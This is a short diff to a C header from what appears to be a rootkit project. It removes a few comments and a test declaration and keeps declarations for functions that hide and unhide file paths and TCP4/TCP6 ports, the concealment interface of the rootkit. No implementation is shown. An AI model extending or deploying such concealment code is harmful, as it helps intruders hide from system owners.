@@ -1,13 +1,7 @@
-//
-// Created by idan on 1/11/24.
-//
-
 #ifndef ROOTKIT_HIDER_H
 #define ROOTKIT_HIDER_H
 
 #include "../kernel_access/kernel_access.h"
-
-// hides files and directories. this is really useful as almost anything in unix is a file
 
 void hide_absolute_path(const char *path);
 void unhide_absolute_path(const char *path);
@@ -20,7 +14,5 @@ void unhide_tcp4_port(PORT port);
 
 void hide_tcp6_port(PORT port);
 void unhide_tcp6_port(PORT port);
-
-void reports_test();
 
 #endif //ROOTKIT_HIDER_H
